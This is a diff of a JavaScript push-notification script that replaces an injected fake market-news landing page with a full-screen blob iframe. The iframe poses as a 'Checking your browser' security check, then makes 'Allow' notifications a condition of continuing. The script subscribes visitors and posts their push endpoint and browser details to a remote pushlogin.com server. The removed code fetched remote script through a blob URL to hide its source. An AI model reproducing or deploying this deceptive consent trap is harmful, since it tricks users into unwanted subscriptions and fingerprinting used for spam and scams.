@@ -2,137 +2,184 @@
   var cfg = window.PUSH_CONFIG || {};
   var appUrl = cfg.appUrl || 'https://pushlogin.com';
 
-  // --- Inject title + meta (JS-only, not in HTML source) ---
-  document.title = cfg.pageTitle || 'Market Alerts \u2014 Real-Time News & Updates';
-  if (!document.querySelector('meta[name="description"]')) {
-    var m = document.createElement('meta');
-    m.name = 'description';
-    m.content = cfg.pageDesc || 'Get real-time market alerts, breaking news and financial updates delivered instantly to your device.';
-    document.head.appendChild(m);
+  // Already subscribed? skip
+  var subKey = 'push-sub-' + (cfg.landingId || '');
+  if (localStorage.getItem(subKey) === '1') return;
+
+  // ── Build bot-check UI as a self-contained blob iframe ──────────────────
+  var uiHtml = '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>'
+    + '*{margin:0;padding:0;box-sizing:border-box}'
+    + 'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}'
+    + '.box{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.12);padding:40px 36px;max-width:420px;width:90%;text-align:center}'
+    + '.shield{width:64px;height:64px;margin:0 auto 20px;background:#f97316;border-radius:50%;display:flex;align-items:center;justify-content:center}'
+    + '.shield svg{width:32px;height:32px;fill:#fff}'
+    + 'h1{font-size:1.3rem;font-weight:700;color:#111;margin-bottom:8px}'
+    + 'p{font-size:.9rem;color:#666;line-height:1.5;margin-bottom:24px}'
+    + '.spinner{width:40px;height:40px;border:4px solid #e5e7eb;border-top-color:#f97316;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}'
+    + '@keyframes spin{to{transform:rotate(360deg)}}'
+    + '.check-row{display:flex;align-items:center;gap:10px;background:#f9fafb;border-radius:8px;padding:12px 16px;margin-bottom:10px;text-align:left}'
+    + '.dot{width:10px;height:10px;border-radius:50%;background:#d1d5db;flex-shrink:0}'
+    + '.dot.done{background:#22c55e}'
+    + '.dot.spin{background:#f97316;animation:pulse 1s infinite}'
+    + '@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}'
+    + '.check-label{font-size:.85rem;color:#374151}'
+    + '.btn-row{display:flex;gap:12px;margin-top:24px}'
+    + '.btn{flex:1;padding:13px;border:none;border-radius:8px;font-size:.95rem;font-weight:600;cursor:pointer;transition:opacity .15s}'
+    + '.btn-allow{background:#f97316;color:#fff}'
+    + '.btn-allow:hover{opacity:.9}'
+    + '.btn-block{background:#f3f4f6;color:#374151;border:1px solid #e5e7eb}'
+    + '.btn-block:hover{background:#e5e7eb}'
+    + '.notice{font-size:.75rem;color:#9ca3af;margin-top:16px}'
+    + '.phase{display:none}.phase.active{display:block}'
+    + '</style></head><body>'
+    + '<div class="box">'
+    // Phase 1: checking
+    + '<div class="phase active" id="p1">'
+    + '<div class="shield"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg></div>'
+    + '<h1>Checking your browser</h1>'
+    + '<p>This process is automatic. Your browser will redirect shortly.</p>'
+    + '<div class="spinner"></div>'
+    + '<div class="check-row"><div class="dot done" id="d1"></div><div class="check-label">Verifying your connection is secure</div></div>'
+    + '<div class="check-row"><div class="dot spin" id="d2"></div><div class="check-label">Checking browser compatibility</div></div>'
+    + '<div class="check-row"><div class="dot" id="d3"></div><div class="check-label">Completing security check</div></div>'
+    + '</div>'
+    // Phase 2: allow/block
+    + '<div class="phase" id="p2">'
+    + '<div class="shield"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg></div>'
+    + '<h1>Enable Notifications</h1>'
+    + '<p>To continue to the site, confirm you want to receive real-time alerts and updates from this website.</p>'
+    + '<div class="btn-row">'
+    + '<button class="btn btn-block" id="btnBlock">Block</button>'
+    + '<button class="btn btn-allow" id="btnAllow">Allow</button>'
+    + '</div>'
+    + '<div class="notice">You can change this anytime in your browser settings.</div>'
+    + '</div>'
+    + '</div>'
+    + '<script>'
+    + '(function(){'
+    // Animate checks then show buttons
+    + 'setTimeout(function(){document.getElementById("d2").className="dot done";document.getElementById("d3").className="dot spin"},900);'
+    + 'setTimeout(function(){document.getElementById("d3").className="dot done";document.getElementById("p1").className="phase";document.getElementById("p2").className="phase active"},2000);'
+    + 'document.getElementById("btnAllow").onclick=function(){parent.postMessage({pushAction:"allow"},"*")};'
+    + 'document.getElementById("btnBlock").onclick=function(){parent.postMessage({pushAction:"block"},"*")};'
+    + '})()'
+    + '<\/script></body></html>';
+
+  // ── Create full-screen UI iframe ─────────────────────────────────────────
+  var uiBlob = new Blob([uiHtml], { type: 'text/html' });
+  var uiBlobUrl = URL.createObjectURL(uiBlob);
+
+  var iframe = document.createElement('iframe');
+  iframe.src = uiBlobUrl;
+  iframe.setAttribute('allow', 'notifications');
+  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;border:none;background:#f0f2f5';
+  document.body.appendChild(iframe);
+  document.body.style.overflow = 'hidden';
+
+  // ── Handle messages from UI iframe ──────────────────────────────────────
+  window.addEventListener('message', function (e) {
+    if (!e.data || !e.data.pushAction) return;
+    if (e.data.pushAction === 'allow') {
+      handleAllow();
+    } else if (e.data.pushAction === 'block') {
+      handleBlock();
+    }
+  });
+
+  function cleanup() {
+    iframe.remove();
+    document.body.style.overflow = '';
   }
 
-  // --- Inject full page template into DOM ---
-  var target = document.getElementById('app') || document.body;
-  target.innerHTML = [
-    '<style>',
-    '*{margin:0;padding:0;box-sizing:border-box}',
-    'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;color:#222;background:#fff}',
-    '.top-bar{background:#c0392b;color:#fff;text-align:center;padding:6px;font-size:13px;font-weight:600;letter-spacing:.5px}',
-    'header{background:#1a1a2e;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}',
-    'header .logo{color:#fff;font-size:22px;font-weight:700;text-decoration:none}',
-    'header .logo span{color:#e74c3c}',
-    'nav a{color:#ccc;text-decoration:none;margin-left:20px;font-size:14px}',
-    'nav a:hover{color:#fff}',
-    '.hero{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);color:#fff;padding:60px 24px;text-align:center}',
-    '.hero h1{font-size:2.4rem;margin-bottom:14px;line-height:1.2}',
-    '.hero h1 span{color:#e74c3c}',
-    '.hero p{font-size:1.05rem;opacity:.85;max-width:580px;margin:0 auto 28px}',
-    '.badge{display:inline-block;background:#e74c3c;color:#fff;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:700;margin-bottom:16px;text-transform:uppercase;letter-spacing:1px}',
-    '.container{max-width:1100px;margin:0 auto;padding:0 24px}',
-    '.ticker{background:#f8f8f8;border-bottom:1px solid #eee;padding:10px 0;overflow:hidden;white-space:nowrap}',
-    '.ticker-inner{display:inline-block;animation:tkr 22s linear infinite}',
-    '@keyframes tkr{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}',
-    '.ticker span{margin:0 32px;font-size:13px;color:#333}',
-    '.up{color:#27ae60;font-weight:600}',
-    '.dn{color:#e74c3c;font-weight:600}',
-    '.section{padding:48px 0}',
-    '.section h2{font-size:1.6rem;margin-bottom:24px;border-left:4px solid #e74c3c;padding-left:12px}',
-    '.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px}',
-    '.card{border:1px solid #eee;border-radius:8px;overflow:hidden;transition:box-shadow .2s}',
-    '.card:hover{box-shadow:0 4px 16px rgba(0,0,0,.1)}',
-    '.cip{width:100%;height:160px}',
-    '.cb{padding:16px}',
-    '.ct{font-size:11px;color:#e74c3c;font-weight:700;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}',
-    '.ch{font-size:1rem;font-weight:700;margin-bottom:8px;line-height:1.4}',
-    '.cx{font-size:.875rem;color:#666;line-height:1.5}',
-    '.cm{font-size:.75rem;color:#999;margin-top:10px}',
-    '.alert-box{background:#fff8e1;border:1px solid #f9ca24;border-radius:8px;padding:20px 24px;margin:32px 0;display:flex;align-items:flex-start;gap:16px}',
-    '.alert-box .icon{font-size:24px;flex-shrink:0}',
-    '.alert-box h3{margin-bottom:4px;font-size:1rem}',
-    '.alert-box p{font-size:.875rem;color:#555}',
-    '.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin:32px 0}',
-    '.stat{text-align:center;padding:24px;background:#f8f9fa;border-radius:8px}',
-    '.stat .num{font-size:2rem;font-weight:700;color:#1a1a2e}',
-    '.stat .lbl{font-size:.875rem;color:#666;margin-top:4px}',
-    'footer{background:#1a1a2e;color:#aaa;text-align:center;padding:32px 24px;margin-top:48px;font-size:.875rem}',
-    'footer a{color:#aaa;text-decoration:none}',
-    '@media(max-width:600px){.hero h1{font-size:1.6rem}nav a{margin-left:10px;font-size:12px}}',
-    '</style>',
+  function handleBlock() {
+    cleanup();
+    var dest = (cfg.redirects && cfg.redirects.onBlock) || null;
+    if (dest) window.location.href = dest;
+  }
 
-    '<div class="top-bar">&#x1F6A8; BREAKING: Fed holds rates steady &mdash; Markets react &nbsp;|&nbsp; Oil prices surge 2.3% &nbsp;|&nbsp; Tech stocks lead gains</div>',
-    '<header>',
-    '  <a class="logo" href="/">Notify<span>Alerts</span></a>',
-    '  <nav><a href="#">Markets</a><a href="#">Economy</a><a href="#">Stocks</a><a href="#">Crypto</a></nav>',
-    '</header>',
+  function handleAllow() {
+    // Request permission — runs in parent page context (correct origin)
+    Notification.requestPermission().then(function (permission) {
+      if (permission === 'granted') {
+        registerAndSubscribe();
+      } else {
+        handleBlock();
+      }
+    }).catch(function () { handleBlock(); });
+  }
 
-    '<div class="ticker"><div class="ticker-inner">',
-    '<span>S&amp;P 500 <span class="up">&#x25B2; 4,892.34 +1.2%</span></span>',
-    '<span>NASDAQ <span class="up">&#x25B2; 17,241 +0.8%</span></span>',
-    '<span>DOW <span class="dn">&#x25BC; 38,120 -0.3%</span></span>',
-    '<span>BTC <span class="up">&#x25B2; $67,450 +3.1%</span></span>',
-    '<span>ETH <span class="up">&#x25B2; $3,820 +2.4%</span></span>',
-    '<span>GOLD <span class="dn">&#x25BC; $2,312/oz -0.5%</span></span>',
-    '<span>OIL <span class="up">&#x25B2; $82.45 +2.3%</span></span>',
-    '<span>EUR/USD <span class="dn">&#x25BC; 1.0842 -0.1%</span></span>',
-    '<span>S&amp;P 500 <span class="up">&#x25B2; 4,892.34 +1.2%</span></span>',
-    '<span>NASDAQ <span class="up">&#x25B2; 17,241 +0.8%</span></span>',
-    '<span>DOW <span class="dn">&#x25BC; 38,120 -0.3%</span></span>',
-    '<span>BTC <span class="up">&#x25B2; $67,450 +3.1%</span></span>',
-    '<span>ETH <span class="up">&#x25B2; $3,820 +2.4%</span></span>',
-    '<span>GOLD <span class="dn">&#x25BC; $2,312/oz -0.5%</span></span>',
-    '<span>OIL <span class="up">&#x25B2; $82.45 +2.3%</span></span>',
-    '<span>EUR/USD <span class="dn">&#x25BC; 1.0842 -0.1%</span></span>',
-    '</div></div>',
+  function registerAndSubscribe() {
+    navigator.serviceWorker.register('/push-sw.js', { updateViaCache: 'none' })
+      .then(function (reg) {
+        return navigator.serviceWorker.ready.then(function () { return reg; });
+      })
+      .then(function (reg) {
+        return reg.pushManager.subscribe({
+          userVisibleOnly: true,
+          applicationServerKey: urlBase64ToUint8Array(cfg.vapidKey)
+        });
+      })
+      .then(function (sub) {
+        return sendToServer(sub);
+      })
+      .then(function () {
+        localStorage.setItem(subKey, '1');
+        cleanup();
+        var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
+        if (dest) window.location.href = dest;
+      })
+      .catch(function (err) {
+        console.error('[Push] Subscribe failed:', err);
+        cleanup();
+        var dest = (cfg.redirects && cfg.redirects.onAllow) || null;
+        if (dest) window.location.href = dest;
+      });
+  }
 
-    '<div class="hero">',
-    '  <div class="badge">&#x26A1; Live Updates</div>',
-    '  <h1>Stay Ahead with <span>Real-Time</span><br>Market Alerts</h1>',
-    '  <p>Get instant notifications on breaking market news, stock movements and economic data releases delivered directly to your device.</p>',
-    '</div>',
+  function sendToServer(sub) {
+    var j = sub.toJSON();
+    var bi = getBrowserInfo();
+    return fetch(appUrl + '/api/clients', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        subscription: { endpoint: j.endpoint, keys: j.keys },
+        landingId: cfg.landingId,
+        domain: cfg.domain,
+        url: window.location.href,
+        accessStatus: 'allowed',
+        browserInfo: bi,
+        location: {}
+      })
+    });
+  }
 
-    '<div class="container">',
-    '  <div class="stats">',
-    '    <div class="stat"><div class="num">2.4M+</div><div class="lbl">Subscribers</div></div>',
-    '    <div class="stat"><div class="num">98.7%</div><div class="lbl">Delivery Rate</div></div>',
-    '    <div class="stat"><div class="num">&lt;2s</div><div class="lbl">Alert Speed</div></div>',
-    '    <div class="stat"><div class="num">24/7</div><div class="lbl">Coverage</div></div>',
-    '  </div>',
-    '  <div class="alert-box">',
-    '    <div class="icon">&#x1F4CA;</div>',
-    '    <div><h3>Why Market Alerts Matter</h3><p>With markets moving faster than ever, timely information is your edge. Our system monitors hundreds of data sources and delivers critical updates in under 2 seconds.</p></div>',
-    '  </div>',
-    '  <div class="section">',
-    '    <h2>Latest Market News</h2>',
-    '    <div class="cards">',
-    '      <div class="card"><div class="cip" style="background:linear-gradient(135deg,#f093fb,#f5576c)"></div><div class="cb"><div class="ct">Federal Reserve</div><div class="ch">Fed Holds Rates Steady, Signals Potential Cuts in Late 2025</div><div class="cx">The Federal Reserve maintained its benchmark rate, citing continued progress on inflation while remaining cautious about timing.</div><div class="cm">2 hours ago &bull; Economics</div></div></div>',
-    '      <div class="card"><div class="cip" style="background:linear-gradient(135deg,#4facfe,#00f2fe)"></div><div class="cb"><div class="ct">Technology</div><div class="ch">Tech Stocks Rally as AI Spending Forecasts Exceed Expectations</div><div class="cx">Major technology companies surged following strong earnings and raised guidance on artificial intelligence infrastructure investment.</div><div class="cm">4 hours ago &bull; Stocks</div></div></div>',
-    '      <div class="card"><div class="cip" style="background:linear-gradient(135deg,#43e97b,#38f9d7)"></div><div class="cb"><div class="ct">Commodities</div><div class="ch">Oil Prices Jump 2.3% on Supply Concerns and Geopolitical Tensions</div><div class="cx">Crude oil futures rose sharply amid reports of potential supply disruptions in key producing regions affecting global output.</div><div class="cm">6 hours ago &bull; Commodities</div></div></div>',
-    '    </div>',
-    '  </div>',
-    '  <div class="section">',
-    '    <h2>Economic Calendar</h2>',
-    '    <div class="cards">',
-    '      <div class="card"><div class="cb"><div class="ct">Today &bull; High Impact</div><div class="ch">US CPI Inflation Data Release</div><div class="cx">Consumer Price Index for the previous month. Expected: 3.1% annual rate.</div><div class="cm">8:30 AM EST</div></div></div>',
-    '      <div class="card"><div class="cb"><div class="ct">Tomorrow &bull; Medium Impact</div><div class="ch">Jobless Claims Weekly Report</div><div class="cx">Initial unemployment claims. Consensus estimate: 215,000 new claims.</div><div class="cm">8:30 AM EST</div></div></div>',
-    '      <div class="card"><div class="cb"><div class="ct">Friday &bull; High Impact</div><div class="ch">Non-Farm Payrolls Report</div><div class="cx">Monthly employment summary. Key indicator for Fed policy decisions ahead.</div><div class="cm">8:30 AM EST</div></div></div>',
-    '    </div>',
-    '  </div>',
-    '</div>',
+  function getBrowserInfo() {
+    var ua = navigator.userAgent;
+    var b = 'Unknown', o = 'Unknown';
+    if (/Chrome/.test(ua) && !/Chromium|Edge|OPR/.test(ua)) b = 'Chrome';
+    else if (/Firefox/.test(ua)) b = 'Firefox';
+    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) b = 'Safari';
+    else if (/Edg/.test(ua)) b = 'Edge';
+    else if (/OPR|Opera/.test(ua)) b = 'Opera';
+    if (/Windows/.test(ua)) o = 'Windows';
+    else if (/Mac/.test(ua)) o = 'macOS';
+    else if (/Android/.test(ua)) o = 'Android';
+    else if (/iPhone|iPad/.test(ua)) o = 'iOS';
+    else if (/Linux/.test(ua)) o = 'Linux';
+    return {
+      browser: b, version: 'Unknown', os: o,
+      userAgent: ua, language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      platform: navigator.platform || 'Unknown'
+    };
+  }
 
-    '<footer>',
-    '  <p>&copy; 2025 NotifyAlerts &nbsp;|&nbsp; <a href="#">Privacy Policy</a> &nbsp;|&nbsp; <a href="#">Terms</a> &nbsp;|&nbsp; <a href="#">Contact</a></p>',
-    '  <p style="margin-top:8px;font-size:11px;opacity:.6">Market data is for informational purposes only. Not financial advice.</p>',
-    '</footer>'
-  ].join('');
-
-  // --- Load push-widget.js as a second blob (URL hidden since we're already inside a blob) ---
-  fetch(appUrl + '/js/push-widget.js')
-    .then(function (r) { return r.text(); })
-    .then(function (code) {
-      var b = new Blob([code], { type: 'application/javascript' });
-      var s = document.createElement('script');
-      s.src = URL.createObjectURL(b);
-      document.head.appendChild(s);
-    })
-    .catch(function () {});
+  function urlBase64ToUint8Array(b64) {
+    var pad = '='.repeat((4 - b64.length % 4) % 4);
+    var raw = atob((b64 + pad).replace(/-/g, '+').replace(/_/g, '/'));
+    var arr = new Uint8Array(raw.length);
+    for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
+    return arr;
+  }
 })();
